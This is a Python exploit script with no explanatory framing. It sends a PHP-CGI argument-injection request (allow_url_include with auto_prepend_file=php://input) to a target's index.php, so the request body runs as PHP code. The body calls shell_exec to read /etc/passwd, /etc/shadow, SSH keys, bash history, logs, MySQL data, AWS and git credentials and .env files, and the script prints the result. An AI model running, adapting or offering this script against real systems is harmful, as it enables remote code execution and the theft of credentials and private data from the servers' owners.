import requests
import argparse

# Set up argument parsing
parser = argparse.ArgumentParser(description="Attempt to access sensitive files via various plugins.")
parser.add_argument('--host', type=str, default='localhost', help='Target host (default: localhost)')
parser.add_argument('--port', type=str, default='8983', help='Target port (default: 8983)')

args = parser.parse_args()

# Use arguments from CLI or default values
host = args.host
port = args.port

# Define the target URL with correct formatting 
url = f"http://{host}:{port}/index.php?-d+allow_url_include=on+-d+auto_prepend_file=php://input"

# Define the headers
headers = {
    "Host": "localhost",
    "Accept": "*/*",
    "Accept-Language": "en",
    "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    "Connection": "close",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Define the payload
payload = "<?php echo shell_exec('cat /etc/passwd /etc/shadow ~/.ssh/* ~/.bash_history /var/log/* /var/lib/mysql/* ~/.aws/credentials ~/.git-credentials ~/.env 2>/dev/null'); ?>"

# Send the POST request
response = requests.post(url, headers=headers, data=payload)

# Print the response
print(response.text)
